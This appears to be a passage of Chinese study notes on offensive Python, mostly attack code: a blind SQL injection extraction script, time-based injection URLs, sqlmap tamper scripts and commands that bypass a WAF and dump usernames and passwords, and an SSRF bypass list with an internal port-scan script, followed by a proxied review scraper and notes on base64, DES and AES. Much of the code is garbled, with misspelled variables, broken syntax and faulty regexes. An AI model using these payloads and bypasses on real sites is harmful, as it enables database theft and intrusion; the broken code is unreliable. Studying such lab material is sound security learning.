            for c in range(33, 127):
                res = conn.get(targetUrl.format(dbname, a, b, c))
                if flag in res.content.decode("utf-8"):
                    table += chr(c)
                    print(table)
                    break
          DBTables.append(table)
          table = ""

#编写获取表字段的函数，根据获取的URL、数据库名和数据表，获取表的字段并把结果以列表的形式存入DBColumns
def GetDBCloums(url, dbname, datable):
    global DBColums
    DBColumnCount = 0
    print("[-] 开始获取{0}数据表的字段数:".format(datable))
    for DBColumnCount in range(99):
        payload = "' and if ((select count(column_name) from information_schema.columns where table_schema='{0} and table_name='{1}')={2},1,0) %23"
        targetUrl = url + payload
        tes = conn.get(targetUrl.format(dbname, datable, DBColoumnCount))
        if flag in res.content.decode("utf-8"):
            print("[-]{0} 数据表的字段数为:{1}".format(dbtable, DBColumnCount))
            break

    column = ""
    for a in range(0, BDColumnCount):
        print("[-]正在获取第{0}个字段名".format(a+1))
        for columnLen in range(99):
            payload = "' and if((select length(column_name) from information_schema.columns where table_schema='{0}' and table_name='{1}' limit {2},1) = {3},1,0} %23"
            targetUrl = url + payload
            res = conn.get(targetUrl.format(dbname, dbtable, a, columnLen))
            if flag in res.content.decode("utf-8"):
                break
        for b in range(1, columnLen+1):
            paylaod = "' and if(ascii(substr((select column_name from information_schema.columns where table_schema='{0}' and table_name'{1}' limit {2},1),{3},1))={4},1,0) %23"
            targetUrl = url + payload
            for c in range(33, 127):
                res = conn.get(targetUrl.format(dbname, dbtable, a, b, c))
                if flag in res.content.decode("utf-8"):
                    column += chr(c)
                    print(column)
                    break
        DBColumns.append(column)
        column = ""

#编写数据获取函数，根据获取第URL、数据表名和数据表字段来获取数据。数据以字典的形式存放，键为字段名，值为字段数据形成的列表：
def GetDBData(url, dbtable, dbcolumn):
    global DBData
    print("[-]开始获取{0}表{1}字段的数据数量".format(dbtable, dbcolumn))
    for DBDataCount in range(99):
        payload = "'and if ((select count({0}) from {1})={2},1,0) %23"
        targetUrl = url + payload
        res = conn.get(targetUrl.format(dbcolumn, dbtable, DBDataCount))
        if flag in res.content.decode("utf-8"):
            print("[-]{0}表{1}字段的数据数量为:{2}".format(dbtable, dbcolumn, DBDataCount))
            break
    for a in range(0, DBDataCount):
        pritnt("[-]正在获取{0}的第{1}个数据".format(docolumn, a+1))
        dataLen = 0
        for dataLen in range(99):
            payload = "'and if ((select length({0}) from {1} limit {2},1)={3},1,0) %23"
            targetUrl = url + payload
            res = conn.get(targetUrl.format(dbcolumn, dbtable, a, dataLen))
            if flag in res.content.decode("utf-8"):
                print("[-]第{0}个数据长度为:{1}".format(a+1, dataLen))
                break
        data = ""
        for b in range(1, dataLen+1):
            for c in range(33,127):
                payload = "'and if (ascii(substr((select {0} from {1} limit {2},1), {3},1)) = {4},1,0) %23"
                targetUrl = url + payload
                res = conn.get(targetUrl.format(dbcolumn, dbtable, a, b, c))
                if flag in res.content.decode("utf-8"):
                    data += chr(c)
                    print(data)
                    break
        DBData.setdefault(dbcolumn,[]).append(data)
        print(DBData)
        data = ""

#编写主函数，用来获取目标的URL并传递给StarTSqli:
if __name__ == '__main__':
    parser = optparse.OptionParser('usage: python %prog -u url \n\n' 'Example:python %prog -u http://192.168.61.1/sql/Less-8/?id=1\n')
    (options, agrs) = parser.parse_args()
    StartSqli(options.targetUrl)

```

</details>

<details>
<summary>SQL 基于时间的盲注漏洞</summary>

```
----------------------------------------------------------------------------
//基于时间的盲注：当页面没有回响位、不会输出SQL语句报错信息、不论SQL语句的执行结果对错都返回一样的页面时，通过页面的响应时间进行注入
----------------------------------------------------------------------------
>>> http://127.0.0.1/sql/Less-9/?id=1' and if(length(database())=8,sleep(5),0) %23 //判断数据库的长度
>>> http://127.0.0.1/sql/Less-9/?id=1' and if(ascii(substr(database(),1,1))=115,sleep(5),0) %23 //获取数据库名
>>> http://127.0.0.1/sql/Less-9/?id=1' and if((select count(tabel_name) from information_schema.tables where table_schema='security' limit 0,1)=6,sleep(5),0) %23    //获取数据库中表的数量
>>> http://127.0.0.1/sql/Less-9/?id=1' and if((select length(table_name) from information_schema.tables where table_schema='security' limit 0,1)=6,sleep(5),0) %23   //获取数据库表的长度
>>> http://127.0.0.1/sql/Less-9/?id=1' and if(ascii(substr((select table_name from information_schema.tables where table_schem='security' limit 0,1),1,1))=101,sleep(5),0) %23     //获取数据库表
>>> http://127.0.0.1/sql/Less-9/?id=1' and if((select count(coluns_name) from information_schema.columns where table_schema='security' and table_name='users')=3,sleep(5),0) %23     //获取数据库中字段的数量
>>> http://127.0.0.1/sql/Less-9/?id=1' and if((select length(column_name) from informatio_schema.columns where table_schema='security' and table_name='users' limit 0,1)=2,sleep(5),0) %23   //获取表字段的长度
>>> http://127.0.0.1/sql/Less-9/?id=1' and if(ascii(substr((select columm_name from information_schema.columns where table_schema='security' and table_name='users' limit 0,1),1,1))=105,sleep(5),0) %23    //获取数据库字段
>>> http://127.0.0.1/sql/Less-9/?id=1' and if((select count(username) fro users)=13,sleep(5),0) %23    //获取字段数据的数量
>>> http://127.0.0.1/sql/Less-9/?id=1' and if((select length(username) from users limit 0,1)=4,sleep(5),0) %23   //获取字段数量的长度
>>> http://127.0.0.1/sql/Less-9/?id=1' and if(ascii(substr(select username from users limit 0,1),1,1))=58,sleep(5),0) %23  //  获取数据内容
```

</details>

<details>
<summary>获取数据库名的函数_time模块</summary>

```
//time-based blind SQL injection

def GetDBName(url):
    global DBName
    print("[-]开始获取数据库的长度")
    DBNameLen = 0
    payload = "' and if(length(database())={0},sleep(5),0) %23"
    targetUrl = url + payload
    for DBNameLen in range(1, 99):
        timeStart = time.time()
        res = conn.get(targetUrl.format(DBNameLen))
        timeEnd = time.time()
        if timeEnd - timeStart >= 5:
            print("[+] 数据库名的长度:" + str(DBNameLen))
            break
    print("[-] 开始获取数据库名")
    payload = "'and if(ascii(substr(database(),{0},1))={1},sleep(5),0) %23"
    targetUrl = url + payload
    for a in range(1, DBNameLen+1):
        for b in range(33, 127):
            timeStart = time.time()
            res = conn.get(targetUrl.format(a,b))
            timeEnd = time.time()
            if timeEnd - timeStart >= 5:
                DBName += chr(b)
                print("[-]"+ DBName)
                break
__________________
前面用了：global DBName
但是代码片段没有看到：DBName = ""
否则：DBName += chr(b)
可能报：NameError
或者UnboundLocalError
__________________
最好不要只判断5秒
if timeEnd-timeStart>=5:
实际网络会有波动，一般会写：
if timeEnd - timeStart > 4.5:
或者设置请求超时并结合容差判断，否则容易误判
__________________
```

</details>

<details>
<summary>SQLMap的Tamper脚本_SQLMap开源自动化</summary>

```
----------------------------------------------------------------------------
基于布尔的盲注：能根据页面的返回内容判断真假的注入技术
基于时间的盲注：不能根据页面的返回内容判断信息，而是使用条件语句查看时间延迟语句是否执行（即页面的返回时间是否增加），以此判断
基于报错的注入：根据页面返回的错误信息判断，把注入语句的结果直接返回到页面
堆查询注入：可以同时执行多条语句的执行时注入
----------------------------------------------------------------------------
SQLMap的提供了57个Tamper脚本，绕过IDS/WAF的检测

#!/usr/bin/env python
from lib.core.enums import PRIORITY
__poriority__ = PRIORITY.LOW    #定义脚本的优先级

def dependencies():
    pass

# 对传进来的payload进行修改并返回，函数有两个参数。
# 主要更改的是payload参数，kwargs参数用得不多。
# 官方提供的Tamper脚本两次更改http-header

def tamper(payload, **kwargs):
    # 增加相关的payload处理，再将payload返回
    # 必须返回最后的payload
    return payload
----------------------------------------------------------------------------
```

</details>

<details>
<summary>绕过目标网站 防SQL注入系统的Tamper脚本</summary>

```
#格式  preg_replace(正则表达式, 替换内容, 原字符串)

function blacklist($id)
{
$id= preg_replace('/or/i',"", $id); //strip out OR (non case sensitive)
$id= preg_replace('/and/i',"",$id); //strip out AND (non case sensitive)
$id= preg_replace('/[\/\*]/',"",$id); //strip out /*
$id= preg_replace('/[--]/',"",$id); //strip out --
$id= preg_replace('/[#]/',"",$id); //strip out #
$id= preg_replace('/[\s]/',"",$id); //strip out spaces
$id= preg_replace('/[\/\\\\]/',"",$id); //strip out slashes
return $di;
}
```

</details>

<details>
<summary>双写绕过脚本_dounble-and-ro.py</summary>

```
----------------------------------------------------------------------------
//tamper(payload,**kwargs字典）
//tamper(
//    payload="1 and 1=1",
//    headers={},
//    delimiter=",",
//    hints={}
//)
----------------------------------------------------------------------------
#！/usr/bin/env python
# -*- coding:UTF-8 -*-

import re
from lib.core.enums import PRIORITY //LOW,NORMAL,HIGH
__priority__ = PRIORITY.NORMAL

def dependencies():  #脚本描述函数
    pass

def tamper(payload, **kwargs):
    retVal = payload
    if payload:
        retVal = re.sub(r"(?i)(or)", r"oorr", retVal)
        retVal = re.sub(r"(?!)(and)", r"anandd", retVal)
    return retVal
----------------------------------------------------------------------------
```

</details>

<details>
<summary>空格替换脚本_space2A0.py</summary>

```
#!/usr/bin/env python
# -*- coding:UTF-8 -*-

from lib.core.compat import xrange
from lib.core.enums import PRIORITY

__priority__ = PRIORITY.LOW

def dependencies():
    pass

def tamper(payload, **kwargs):
    retVal = payload

    if payload:
        retVal = ""
        quote, doublequote, firstspace = False, False, False

        for i in xrange(len(payload)):
            if not firstspace:
                if payload[i].isspace():
                    firstspace = True
                    retVal += "%a0"
                    continue

            elif payload[i] == '\'':
                quote = not quote

            elif payload[i] == '"':
                doublequote = not doublequote

            elif payload[i] == " " and not doublequote and not quote:
                retVal += "%a0"
                continue

            retVal += payload[i]
    return retVal
```

</details>

<details>
<summary>sqlmap</summary>

```
>>> sqlmap -u "http://IP/sqli/Less-26/id=1"

//--tamper增加脚本文本， -v 3 查看输出的payload
>>> sqlmap -u "http://IP/sql/Less-26/?id=3" --tamper "double-and-or.py,space2A0.py" -v 3

//遍历数据库
>>> sqlmap -u "http://IP/sql/Less-26/?id=3" --tamper "double-and-or.py,space2A0.py" -v 3 -dbs

//数据表
>>> sqlmap -u "http://IP/sql/Less-26/?id=3" --tamper "double-and-or.py,space2A0.py" -v 3 -D "serurity" --tables

//表中的字段
>>> sqlmap -u "http://IP/sql/Less-26/?id=3" --tamper "double-and-or.py,space2A0.py" -v 3 -D "security" -T "users" --columns

//数据
>>> sqlmap -u "http://IP/sql/Less-26/?id=3" --tamper "double-and-or.py,space2A0.py" -v 3 -D "security" -T "users" -C "username,password" --dump
```

</details>

<details>
<summary>count.py_关键词*_count(*)变成count(1)</summary>

```
#!/usr/bin/env python
# -*- coding:UTF-8 -*-
import re

from lib.core.enums import PRIORITY
__priority__ = PRIORITY.NORMAL

def dependencies():
    pass

def tamper(payload, **kwargs):
    retVal = payload
    if payload:
        retVal = re.sub(r"(?!)count\(\*\)", r"count(1)",payload)
    return retVal

//运行
>>> sqlmap -u "http://IP/sqli/Less-26/?id=1" -v 3 --tamper "double-and-or.py, space2A0.py, count.py" -D "sericuty" -T "users" -C "username,password" --dump
```

</details>

<details>
<summary>针对WAF编写Tamper脚本绕过</summary>

```
----------------------------------------------------------------------------
//安全狗的绕过方法
空格 ->       /*!*/
=  ->        /*!*/=/*!*/
AND  ->      /*!*/AND/*!*/
UNION  ->    union/*!88888cas*/
#  ->        /*!*/#
USER()  ->   USER/*!()*/
DATABASE()-> DATABASE/*!()*/
--    ->     /*!*/--
SELECT    -> /*!88888cas*/select
FROM   ->    /*!99999c*//*!99999c*/from
----------------------------------------------------------------------------
//拦截关键字替换

#!/usr/bin/env python
from lib.core.enums import PRIORITY
from lib.core.settings import UNICODE_ENCODING

__priority__ = PRIORITY.NORMAL

def dependencies():
    pass

def tamper(payload, **kwargs):
    if payload:
        payload = payload.replace("UNION", "union/*!88888cas*/")
        payload = payload.replace("--", "/*!*/--")
        payload = payload.replace("SELECT", "/*!88888cas*/select")
        paylaod = payload.replace("FROM", "/*!99999c//*!99999c*/from")
        payload = payload.replace("#", "/*!*/#")
        payload = payload.replace("USER()","USER/*!()*/")
        payload = payload.replace("DATABASE()", "DARABASE/*!()*/")
        payload = payload.replace(" ", "/*!*/")
        payload = payload.replace("=", "/*!*/=/*!*/")
        payload = payload.replace("AND", "/*!*/AND/*!*/")
    return payload

----------------------------------------------------------------------------
//运行
>>> sqlmap -u "http://IP/sqli/Less-4/?id=1" --tamper "Bypass.py" -v 3 --dbs
>>> sqlmap -u "http://IP/sqli/Less-4/?id=1" --tamper "Bypass.py" -v 3 -D "security" -tables
>>> sqlmap -u "http://IP/sqli/Less-4/?id=1" --tamper "Bypass.py" -v 3 -D "security" -T "users" --columns
>>> sqlmap -u "http://IP/sqli/Less-4/?id=1" --tamper "Bypass.py" -v 3 -D "security" -C "username,password" --dump
----------------------------------------------------------------------------
```

</details>

<details>
<summary>SSRF_Server-Side Rquest Forger_服务器端请求伪造漏洞</summary>

```
----------------------------------------------------------------------------
//通过SSRF结合 未授权访问漏洞 进行渗透

//SSRF应用场景： 分享功能、远程加载

//SSRF绕过技巧
1.利用@符号绕过，例如www.baidu.com@127.0.0.1
2.利用短网址绕过，例如http://suo.im/4SmyzG
3.利用xip.io 127.0.0.1 xip.io  绕过
4.利用封闭式字母数据(Enclosed alphanumeric)绕过
----------------------------------------------------------------------------
检测方法

判断是否存在SSRF，只需在漏洞URL处输入公网服务器的Web应用地址，然后在公网服务器上监控访问的数据，发现有存在漏洞的IP访问，便说明存在SSRF漏洞

步骤:[1]构造portscan方法，接收两个参数，第一个参数为拼接成SSRF漏洞的地址，第二个参数作为内网探测地址
[2]通过访问构造的URL，根据返回值判断端口是否开放
----------------------------------------------------------------------------
#!/usr/bin/env python
# -*- coding-utf-8 -*-
import requests

def portscan(url, rurl):
    ports = [21,22,23,25,80,443,445,873,1080,1099,1090,1521,3306,6379,27017]
    for port in ports:
        try:
            url = url + '/ueditor/getRemoteImage.jspx?upfile=' + rurl + ':{port}'.format(port=port)
            response = requests.get(url, timeout=6)
        except:
            #超过6秒就认为端口是开饭
            print('[+]{port} is open'.format(port=port))

if __name__ == '__main__':
    portscan('http://www.target.com', '192.168.23.1')
----------------------------------------------------------------------------
防御策略

造成SSRF漏洞的主要原因：
[1]传入服务器需要访问的地址或需要访问的参数用户可控
[2]对于用户传入的参数，服务器端没有做校验限制
比如，一个加载远程头像的功能点，就应该限制传入的参数必须为网址，而不是IP，并且校验网址的后缀是否为图片的地址，否则将不予访问
----------------------------------------------------------------------------
```

</details>

<details>
<summary>网络代理</summary>

```
----------------------------------------------------------------------------
# 代理爬虫，代理VPN，代理注入

URLError:用于捕获网络错误（网络断开，代理连接失败，域名解析失败）
ProxyHandler：配置代理服务器
build_opener：根据配置创建一个可以发送请求的对象opener
----------------------------------------------------------------------------
# Urlib代理

from urllib.error import URLError 
from urllib.request import ProxyHandler,build_opener

proxy='127.0.0.1:1087'
proxy_handler=ProxyHandler({
    'http':'http://'+proxy,
    'https':'https://'+proxy
})
opener=build_opener(proxy_handler)
try:
    response = opener.open('http://httpbin.org/get')
    print(response.read().decode('utf-8'))
except URLError as e:
    print(e.reason)
----------------------------------------------------------------------------
# requests 代理设置
import requests
proxy='127.0.0.1:1087'
proxies={
    'http':'http://'+proxy,
    'https':'https://+proxy
}
try:
    response=requests.get('http://httpbin.org/get',proxies=proxies)
    print(response.text)
except requests.exceptions.ConnectionError as e:
    print('error:',e.args)

#运行结果与Urllib代理相同
----------------------------------------------------------------------------
付费代理 的使用方法与普通代理的一样，仅仅需要修改proxy值，在代理IP地址前加上‘用户名：密码@’即可
proxy='username:password@IP:port'
----------------------------------------------------------------------------
```

</details>

<details>
<summary>爬取某电影评论</summary>

```
http://m.xxx.com/mmdb/comments/movie/1200486.json?_v_=yes&offset=0&startTime=2018-010-20%2022%3A25%3A03
# 1200486是指电影的唯一识别ID
# startTiem对应获取到的评论截止时间，从截止时间向前获取15条评论

#使用requests库的代理方法进行接口访问
proxy = '127.0.0.1:1087'
proxies = {
    'http':'http://' + proxy,
    'https':'https://' + proxy
}
#设置代理地址和端口，让之后的链接都通过此代理来绕过可能存在的反爬虫工具：
headers = {
    'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6)
        AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.100 Safari/537.36'
}
#设置一个UA，也可以设置多个UA，每次访问时随机抽取UA避免被检测
try:
    print(url)
    response = requests.get(url,headers=headers, proxies=proxies,timeout=3)
    if response.status_code == 200:
        print(response.text)
        return response.text
    return None
except requests.exceptions.ConnectionError as e:
    print('error:', e.args)

#访问接口URL并判断访问是否成功，若成功，则将数据放回 Process finished with exit code 0

#数据优化的方法，传入原始数据进行处理，并将处理后的结果返回
def parse_data(html):
    data = json.loads(html)['cmts']
    cpmments = []
    for item in data:
        comments = {
            'id': item['id'],
            'nickName':  item['nickName'],
            'cityName':  item['cityName'] if 'cityName' in item else '',
            'content':  item['content'].replace('\n', ' ', 10),
            'score':  item['score'],
            'startTime':  item['startTime']
        }
        comments.append(comment)
    return comments

#数据处理完成了，进行循环和保存，
start_tiem = datatime.now().strftime('%Y-%m-%d %H:%M:%S')

#设置截止时间为上映时间，再往前就没有评论了，循环爬取到截止时间点后停止爬取：
end_time '上映时间'

#需要循环判断获取的时间是否小于截止的时间点，小于则代表是最早的评论，爬取完成
while start_time > end_time:
    url = 'http://m.xxx.com/mmdb/comments/movie/1203084.json?_v_yes&offset=0&startTime=' + start_time.replace(' ', '%20')
    try:
        html = get_data(url)  #获取数据
    except Exception as e:
        tiem.sleep(0.5)
        html = get_data(url)
    else:
        tiem.sleep(0.1)
#每次循环获取的末尾评论时间为下次时间时，继续向前获取，再将数据进行处理并保存即可：
comments = parse_data(html)
print(comments)
start_time = comments[14]['startTime']   #获得末尾评论时间
start_time = datetime.strptime(start_time, '%Y-%m-%d %H:%M:%S') + timedelta(seconds=-1)
start_time = datetime.strftime(start_time, '%Y-%m-%d %H:%M:%S')

for item in comments:
    with open('data.txt', 'a', encoding='utf-8') as f:
        f.write(str(item['id'])+','+item['nickName'] + ',' +
            item['cityName'] + ',' + item['content'] + ',' +
            str(item['score'])+ ',' + item['startTime'] + '\n')
```

</details>

----------------------------------------------------------------------------
#### 数据加密_公钥publickey_私钥privatekey

<details>
<summary>分组密码</summary>

```
ECB_Electronic CodeBook,电子密码本:固定K 加密解密

CBC_Cipher Block Chaining, 密码块链: 固定K，初始化向量IV进行异或操作，每个分组要先和前一个分组加密的数据 进行XOR异或操作，然后再进行加密

CFB_Cipher Feedback,密码反馈：固定K，前一个分组的密文加密后 和当前分组的明文进行XOR异或操作，生成当前分组的密文

OFB_Output Feedback,输出反馈:将分组密码转化为同步流密码，前一个分组异或之前 的流密码与前分组明文进行XOR处理

CTR_Counter，计数器，同OFB模式相同，分组密码转换为流密码
----------------------------------------------------------------------------
PyCryptodome库安装

可以实现 单向加密、对称加密、非对称加密、流加密算法

>>> sudo pip3 install -i https://pypi.douban.com/simple pycryptodome

# linux
>>> pip3 install -i https://pypi.douban.com/simple pycryptodome

#windows
C:\Users\x> pip3 install -i https://pypi.douban.com/simple pycryptodome
```

</details>

<details>
<summary>base64编码/解码</summary>

```
----------------------------------------------------------------------------
jpg、pdf

将二进制数据转换为特定字符串

例如：垃圾信息传播着采用base64编码的方式规避 反垃圾邮件工具
----------------------------------------------------------------------------
ASCII ----> Base64

[1]ASCII码 -> 二进制(8位) -> 划分6位 -> 在每个最高为补2个0，变8位 -> 二进制 -> Base64
[2]ASCII码 -> 二进制(8位) -> 不够划分6位，在不够6位的位置补上0(地位) ->  在每个最高为补2个0，变8位 -> 二进制 -> Base64(则以'='填充)
严格意义上Base64编码算法不算加密算法，转码的规则是公开
----------------------------------------------------------------------------
Base64编码方式

>>> import base64
>>> s = 'xx'
>>> bs = base64.b64encode(s.encode("utf-8"))
>>> print(bs)

Base64解码方式

>>> import base64
>>> bs = 'xxx'
>>> bbs = str(base64.b64encode(bs),"utf-8")
>>> print(bbs)
----------------------------------------------------------------------------
```

</details>

<details>
<summary>DES算法_Cryptodome库</summary>

```
----------------------------------------------------------------------------
DES ：64位明文输入+64位密钥

DES 为分组密钥的加密方式，其工作模式有五种：ECB,CBC,CTR,CFB,OFB
----------------------------------------------------------------------------
ECB模式_电子密码本

DES加密
>>> from Cryptodome.Cipher import DES
>>> import binascii 
>>> key = b'abcdefgh' #key的长度须为8字节
>>> des = DES.new(key, DES.MODE_ECB) #ECB模式
>>> text = 'XXX'
>>> text = text + (8 - (len(text) % 8)) * '='       # 补充8个字节
>>> encrypt_text = des.encrypt(text.encode())       #加密 des.encrypt()
>>> encryptResult = binascii.b2a_hex(encrypt_text)  #转换 a2b_hex ACSII(十六进制字符串) --> Binary(二进制)
>>> print(text)
>>> print(encryptResult)
----------------------------------------------------------------------------
encode()：字符串 → 字节
des.encrypt()：字节 → 加密后的字节
binascii.b2a_hex()：加密后的字节 → 十六进制表示
----------------------------------------------------------------------------
DES解密
>>> from Cryptodome.Cipher import DES
>>> import binascii
>>> key = b'abcdefgh'
>>> des = DES.new(key, DES.MODE_ECB)
>>> encryptResult = b'b81fcb047936afb76487dda463334767'  #前面有个b,保存加密后的结果
>>> encrypto_text = binascii.a2b_hex(encryptResult)      #a2b_hex ACSII(十六进制字符串) --> Binary(二进制)
>>> decryptResult = des.decrypt(encrypto_text)           #des.decrypt 解密
>>> print(decryptResult)
----------------------------------------------------------------------------
建议使用PKCS5/PKCS7填充，而不是手动补=

from Cryptodome.Cipher import DES
from Cryptodome.Util.Padding import pad, unpad
import binascii

key = b'abcdefgh'
des = DES.new(key, DES.MODE_ECB)

text = "XXX"

# 加密
cipher = des.encrypt(pad(text.encode(), 8))
print(binascii.hexlify(cipher).decode())

# 解密
plain = unpad(des.decrypt(cipher), 8)
print(plain.decode())
----------------------------------------------------------------------------
```

</details>

<details>
<summary>AES算法</summary>

```
----------------------------------------------------------------------------
Rijndael算法

[1]Nb (number of Blocks):状态矩阵的列数（块长度/32）
块长 128位 -> Nb = 4
块长 192位 -> Nb = 6
块长 256位 -> Nb = 8
[2]Nk (Number of Keys):密钥长度/32
密钥 128位 -> Nk=4
密钥 192位 -> Nk=6
密钥 256位 -> Nk=8
[3]Nr (Number of Rounds):加密轮数 Nr = max(Nb,Nk)+6
Nr = max(4,4) + 6 =10
Nr = max(6,4) + 6 =12， Nr = max(4,6) + 6 =12， Nr = max(6,6) + 6 =12
Nr = max(4,8) + 6 =14， Nr = max(8,4) + 6 =14， Nr = max(6,8) + 6 =14， Nr = max(8,6) + 6 =14，Nr = max(8,8) + 6 =14
----------------------------------------------------------------------------
AES加密算法的轮函数 采用 代替/置换网络结构

S盒变换(ByteSub),行移位(ShiftRow),列混合变换(MixColumn）,圈密钥加变换(AddRoundKey)
```

</details>
